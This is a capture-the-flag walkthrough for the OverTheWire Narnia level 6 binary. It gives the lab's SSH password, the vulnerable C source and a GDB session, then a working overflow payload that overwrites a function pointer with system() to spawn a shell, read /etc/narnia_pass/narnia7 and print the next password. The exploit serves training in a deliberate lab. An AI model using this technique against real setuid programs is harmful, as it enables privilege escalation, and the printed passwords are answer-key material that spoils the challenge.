## Login 

` SSH : ssh narnia6@narnia.labs.overthewire.org -p 2226 `
` Pass : BNSjoSDeGL `

## Solution

First, let’s try to execute the program…

```
$ ssh narnia6@narnia.labs.overthewire.org -p 2226

narnia6@narnia:~$ cd /narnia/
narnia6@narnia:/narnia$ ./narnia6
./narnia6 b1 b2
narnia6@narnia:/narnia$ ./narnia6 123 456
123
```

It seems that the program takes 2 arguments and print the first one. Let’s check the source code to understand how it works.
### Source Code

Here is the source :

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;

	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));

	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));

	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);

	setreuid(geteuid(),geteuid());
    fp(b1);

	exit(1);
}
```

If we skim-through the code, our arguments are respectively copied into **b1** and **b2**. Also the **fp** variable is pointing to the _puts()_ function, that’s why `fp(b1)` prints our first arguments.

If we run GDB and place a breakpoint at `fp(b1)` and analyse the stack, we should be able to see where are our variables in memory.

```
$ gdb narnia6

(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x080485a8 <+0>:	push   ebp
   0x080485a9 <+1>:	mov    ebp,esp
   0x080485ab <+3>:	push   ebx
   0x080485ac <+4>:	sub    esp,0x18
   0x080485af <+7>:	mov    DWORD PTR [ebp-0xc],0x8048430
 
...[removed]...

   0x080486d1 <+297>:	call   0x8048410 <geteuid@plt>
   0x080486d6 <+302>:	push   ebx
   0x080486d7 <+303>:	push   eax
   0x080486d8 <+304>:	call   0x8048450 <setreuid@plt>
   0x080486dd <+309>:	add    esp,0x8
   0x080486e0 <+312>:	lea    eax,[ebp-0x14]
   0x080486e3 <+315>:	push   eax
   0x080486e4 <+316>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080486e7 <+319>:	call   eax ; Break here
   0x080486e9 <+321>:	add    esp,0x4
   0x080486ec <+324>:	push   0x1
   0x080486ee <+326>:	call   0x8048440 <exit@plt>
End of assembler dump.
(gdb) break *main+319
Breakpoint 1 at 0x80486e7
(gdb) run AAAA BBBB
Starting program: /narnia/narnia6 AAAA BBBB

Breakpoint 1, 0x080486e7 in main ()
(gdb) x/16wx $esp
0xffffd678:	0xffffd684	0x42424242	0xf7fc5300	0x41414141
0xffffd688:	0x08048700	0x08048430	0x00000003	0x00000000
0xffffd698:	0x00000000	0xf7e2a286	0x00000003	0xffffd734
0xffffd6a8:	0xffffd744	0x00000000	0x00000000	0x00000000
(gdb)
(gdb) x/x $eax
0x8048430 <puts@plt>:	0x99c825ff
```

Here, we can see our arguments **AAAA** (`0x41414141`) and **BBBB** (`0x42424242`). Also, we can see the pointer to the _puts()_ function contained in **EAX** (`0x8048430`). The address of _puts()_ is higher on the stack so, we should be able to overwrite it. Let’s try…

```
(gdb) run AAAAAAAACCCC BBBB
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 AAAAAAAACCCC BBBB

Breakpoint 1, 0x080486e7 in main ()
(gdb) x/16wx $esp
0xffffd678:	0xffffd684	0x42424242	0xf7fc5300	0x41414141
0xffffd688:	0x41414141	0x43434343	0x00000000	0x00000000
0xffffd698:	0x00000000	0xf7e2a286	0x00000003	0xffffd734
0xffffd6a8:	0xffffd744	0x00000000	0x00000000	0x00000000
(gdb) x/x $eax
0x43434343:	Cannot access memory at address 0x43434343
```

Looks very good ! Now, the idea would be to overwrite the return address with the address of _system()_ and call a shell.

```
(gdb) p system
$2 = {<text variable, no debug info>} 0xf7e4c850 <system>
(gdb) run $(python -c 'print "sh;" + 5 * "A" + "\x50\xc8\xe4\xf7" + " BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 $(python -c 'print "sh;" + 5 * "A" + "\x50\xc8\xe4\xf7" + " BBBB"')

Breakpoint 1, 0x080486e7 in main ()
(gdb) x/16wx $esp
0xffffd678:	0xffffd684	0x42424242	0xf7fc5300	0x413b6873
0xffffd688:	0x41414141	0xf7e4c850	0x00000000	0x00000000
0xffffd698:	0x00000000	0xf7e2a286	0x00000003	0xffffd734
0xffffd6a8:	0xffffd744	0x00000000	0x00000000	0x00000000
(gdb) continue
Continuing.
$
```

We got a shell ! Now, let’s do the same outside GDB.

```
narnia6@narnia:/narnia$ ./narnia6 $(python -c 'print "sh;" + 5 * "A" + "\x50\xc8\xe4\xf7" + " BBBB"')
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
54RtepCEU0
```

Done !